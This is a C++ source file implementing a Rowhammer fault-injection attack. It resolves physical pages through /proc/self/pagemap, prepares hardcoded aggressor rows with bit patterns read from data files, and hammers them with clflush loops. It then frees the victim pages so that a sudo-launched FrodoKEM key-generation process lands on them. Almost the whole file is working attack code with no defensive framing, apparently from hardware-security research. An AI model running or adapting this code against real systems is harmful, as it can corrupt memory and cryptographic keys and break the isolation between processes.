#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <sys/sysinfo.h>
#include <utility> 
#include <sys/personality.h>


#include <sched.h>
#include <inttypes.h>
#include <time.h>


#define NUMBER_PAGES 3
#define PAGE_SIZE 4096
#define TOGGLES 3000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define MAX_POSITION 9

using namespace std;

int STACK_SIZE = 0;

size_t mem_size;
char *memory;
double fraction_of_physical_memory = 0.85;

bool hammer = true;


enum Pattern { zero_zero_zero, zero_zero_one, one_zero_zero, one_zero_one };

struct PageCandidate {
    uint32_t pageNumber;
    uint32_t abovePage;
    uint32_t belowPage;

    uint8_t* pageVA;
    uint8_t* aboveVA[2];
    uint8_t* belowVA[2];
};


uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}

uint64_t get_same_row_mapping(void* virt_addr) {
    uint64_t phys_addr = getPage((uint8_t *) virt_addr);
    uint64_t value = ((uintptr_t) phys_addr) >> (17 - 12);
    return value;
}

void pageRowMatchers(uint8_t* addr, int size) {
    printf("Page starting at %p\n", addr);

    int addrOffset = 0xFFF & (intptr_t) addr;
    int addrPageSpan = (int) ceil((addrOffset + size) / 4096.0);
    printf("Number pages spanned: %i\n", addrPageSpan);

    for(int i = 0; i < addrPageSpan; i++) {
        uint64_t rowMapping = 0;
        if(i == addrPageSpan - 1) {
            rowMapping = get_same_row_mapping((void *) addr + (i - 1) * 4096 + (0xFFF - addrOffset));
            printf("Page %i: %lx\n", i, rowMapping);
        } else {
            rowMapping = get_same_row_mapping((void *) addr + i * 4096);
            printf("Page %i: %lx\n", i, rowMapping);
        }   


    }
    printf("\n");
}

void pageRowMatchersUpdated(uint8_t* addr, vector<uint64_t> &mappings) {
    printf("Page starting at %p\n", addr);
   
    uint64_t rowMapping = 0;
    rowMapping = get_same_row_mapping((void *) addr);
    printf("Page %i: %lx\n", 0, rowMapping);
    
    mappings.push_back(rowMapping);

    
    printf("\n");
}


bool pagesFilled(PageCandidate p) {
    if(p.pageVA != 0 && p.aboveVA[0] != 0 && p.aboveVA[1] != 0 && p.belowVA[0] != 0 && p.belowVA[1] != 0) {
        return true;
    } else {
        return false;
    }
}


void *GetBlockByOrder(int order){
    size_t s=PAGE_SIZE*pow(2, order);
    mem_size = s;
    void *ptr = mmap(NULL, s, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(ptr!= (void*)-1);

    for (uint64_t index = 0; index < s; index += 0x1000) {
        uint64_t* temporary = reinterpret_cast<uint64_t*>(static_cast<uint8_t*>(ptr) + index);
        temporary[0] = index+1;
    }
    return ptr;
}


uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));

    printf("MemorySize: %zx\n", mem_size);  


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(memory != MAP_FAILED);

    for(size_t i = 0; i < mem_size; i++) {
	    memory[i] = 77 + i;
    }
}

void fillMemory(uint8_t* victimVA, uint8_t* aboveVA, uint8_t* belowVA) {
    memset((void *) victimVA, 0x00, PAGE_SIZE);

    uint8_t lowerBits = 0x00;
    uint8_t upperBits = 0x01;
    for(int i = 0; i < PAGE_SIZE; i++) {
        if(i % 2 == 0) {
            memset((void *) (aboveVA + i), lowerBits, 1);
            memset((void *) (belowVA + i), lowerBits, 1);
        } else {
            memset((void *) (aboveVA + i), upperBits, 1);
            memset((void *) (belowVA + i), upperBits, 1);
        }
    }
}















void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations, int togs) {
    for(int i = 0; i < iterations; i++) {
        volatile uint64_t *f = (volatile uint64_t *)aboveVA;
        volatile uint64_t *s = (volatile uint64_t *)belowVA;
        unsigned long iters = togs;

        for(; iters --> 0;) {
            asm volatile("clflush (%0)" : : "r" (f) : "memory");
            *f;
            asm volatile("clflush (%0)" : : "r" (s) : "memory");
            *s;
        }
    }
}



void addVAstoPages(vector<PageCandidate> &pages) {
    printf("Searching for page VAs...\n");
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }

            if(p.abovePage == moverPA) {
                p.aboveVA[0] = moverVA;
	        	match = true;
            }
            if(p.belowPage == moverPA) {
                p.belowVA[0] = moverVA;
	        	match = true;
            }

            if(p.abovePage + 1 == moverPA) {
                p.aboveVA[1] = moverVA;
	        	match = true;
            }
            if(p.belowPage + 1 == moverPA) {
                p.belowVA[1] = moverVA;
	        	match = true;
            }

            pages[i] = p;
        }



            moverVA += 0x1000;
    }
    printf("Done searching...\n\n");
}

void keepSameDRAMRowPages(vector<PageCandidate> &pages, vector<uint64_t> &sameRowValues) {
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }

            if(p.abovePage == moverPA) {
                p.aboveVA[0] = moverVA;
	        	match = true;
            }
            if(p.belowPage == moverPA) {
                p.belowVA[0] = moverVA;
	        	match = true;
            }

            if(p.abovePage + 1 == moverPA) {
                p.aboveVA[1] = moverVA;
	        	match = true;
            }
            if(p.belowPage + 1 == moverPA) {
                p.belowVA[1] = moverVA;
	        	match = true;
            }

            for(int i = 0; i < sameRowValues.size(); i++) {
                if(sameRowValues[i] == get_same_row_mapping((void *) moverVA)) {
                    match = true;
                }
            }

            pages[i] = p;
        }

            moverVA += 0x1000;
    }
}

void formOuterPages(PageCandidate page) {
    string line;
    string fileName = "suppression_data/";
    ifstream myfile(fileName.append(to_string(page.pageNumber)).append(".txt"));


    if(myfile.is_open()) {
        while(getline(myfile,line)) {
            int pos = line.find(",");
            
            int index = stoi(line.substr(0, pos));
            int bit = stoi(line.substr(pos + 1));

            printf("line: %s\n", line.c_str());
            printf("index: %i\n", index);
            printf("bit: %i\n", bit);
            printf("\n");

            uint16_t* aboveAddress[2];
            uint16_t* belowAddress[2];

            aboveAddress[0] = reinterpret_cast<uint16_t*>(page.aboveVA[0] + index * 2);
            aboveAddress[1] = reinterpret_cast<uint16_t*>(page.aboveVA[1] + index * 2);
            
            belowAddress[0] = reinterpret_cast<uint16_t*>(page.belowVA[0] + index * 2);
            belowAddress[1] = reinterpret_cast<uint16_t*>(page.belowVA[1] + index * 2);

            uint16_t mask = 0x1 << bit;
            *aboveAddress[0] |= mask;
            *aboveAddress[1] |= mask;
            *belowAddress[0] |= mask;
            *belowAddress[1] |= mask;
        }
        myfile.close();
    }
    else cout << "Unable to open file"; 
}


void rowhammerAttack(vector<PageCandidate> &pages) {
    for(int i = 0; i < NUMBER_PAGES; i++) {
        printf("Above VA1: %p\n", pages[i].aboveVA[0]);
        printf("Above VA2: %p\n", pages[i].aboveVA[1]);
        printf("Target VA: %p\n", pages[i].pageVA);
        printf("Below VA1: %p\n", pages[i].belowVA[0]);
        printf("Below VA2: %p\n", pages[i].belowVA[1]);
        printf("\n");
    }


    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p = pages[i];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
        }
    }
    printf("All pages found...\n");

    printf("Pages size: %i\n", pages.size());

    printf("Holding same DRAM pages\n");
    

    for(int i = 0; i < NUMBER_PAGES; i++) {
	    PageCandidate p = pages[i];
	    fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
	    fillMemory(p.pageVA, p.aboveVA[1], p.belowVA[1]);
        formOuterPages(p);
    }



    uint8_t *mapping = (uint8_t *)(GetBlockByOrder(12));

    vector<pair<int, uint64_t>> indices;
    int count = 0;
    while(indices.size() < 2 * STACK_SIZE) {
        pair<int, uint64_t> p;
        uint64_t addrs = getPage((uint8_t*)mapping+PAGE_SIZE*count);
        if(addrs <= 0x100000) { 
            p = make_pair(count, addrs);
            indices.push_back(p);
        }
        count++;

    }
  


    for(int i = 0; i < STACK_SIZE; i++) {
	    printf("Bottom Iteration %i: %lx\n", i, indices[i].second);
    }
    for(int i = 0; i < NUMBER_PAGES; i++) {
	    printf("Victim Iteration %i: %x\n", i, pages[i].pageNumber);
    }
    for(int i = STACK_SIZE; i < STACK_SIZE * 2; ++i) {
	    printf("Top Iteration %i: %lx\n", i, indices[i].second);
    }



    printf("Starting hammering...\n");

    fflush(stdout);
    sleep(1);


   

    int pid = fork();
    if(pid == 0) {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(1, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");

        for(int i = 0; i < STACK_SIZE; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }
        for(int i = 0; i < NUMBER_PAGES; i++) {
            memset((void *) pages[i].pageVA, i&0xFF, PAGE_SIZE);
        }
        for(int i = STACK_SIZE; i < STACK_SIZE * 2; i++) {
            int index = indices[i].first;
            memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
        }

        while(hammer) {
                int togs = TOGGLES;
                for(int pNum = 0; pNum < 3; pNum++) {
                    rowhammer(pages[pNum].aboveVA[0], pages[pNum].belowVA[0], 1, togs);
                }
        }
    } else {
        sleep(10);

        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(2, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
            printf("ERROR WITH SCHEDAFFINITY");


        for(int i = 0; i < STACK_SIZE; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }
        for(int i = 0; i < NUMBER_PAGES; i++) {
            munmap((void *) pages[i].pageVA, PAGE_SIZE);
        }
        for(int i = STACK_SIZE; i < STACK_SIZE * 2; i++) {
            int index = indices[i].first;
            munmap(mapping + PAGE_SIZE * index, PAGE_SIZE);
        }

        int ok = system("sudo taskset 0x4 ../frodokem/PQCrypto-LWEKE/frodo_keypair > vic.txt");
        
        printf("System call status: %i\n", ok);

        sleep(5);


        system("sudo pkill attack");
    }



	printf("Done hammering\n");
	return;
}







int main(int argc, char *argv[]) {
    printf("Starting program...\n");
    int opt;
    while ((opt = getopt(argc, argv, "to:")) != -1) {
        switch(opt) {
            case 'o':
                STACK_SIZE = (int) strtol(optarg, NULL, 10);
		        break;
            case 't':
                hammer = false;
                printf("Starting test mode...\n\n");
                break;
        }
    }

    printf("Stack size is %i\n", STACK_SIZE);

    string fileText;
    string subString;
    string dataString;
    string needle;
    int pageCount = 0;
    uintptr_t pageValue;


    uintptr_t attackPages[NUMBER_PAGES] = {0xc2c4d, 0x45a9f, 0x2215c};
    uintptr_t abovePages[NUMBER_PAGES] = {0xc2c0f, 0x45a58, 0x2211e};
    uintptr_t belowPages[NUMBER_PAGES] = {0xc2c8a, 0x45adc, 0x2219a};

    setupMapping();
    printf("Finished setting up memory...\n");

    vector<PageCandidate> pages;
    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p;
        p.pageNumber = attackPages[i];
        p.abovePage = abovePages[i];
        p.belowPage = belowPages[i];

        p.pageVA = 0;
        p.aboveVA[0] = 0;
        p.aboveVA[1] = 0;
        p.belowVA[0] = 0;
        p.belowVA[1] = 0;
        pages.push_back(p);
    }

    addVAstoPages(pages);

    rowhammerAttack(pages);

    return 0;
}
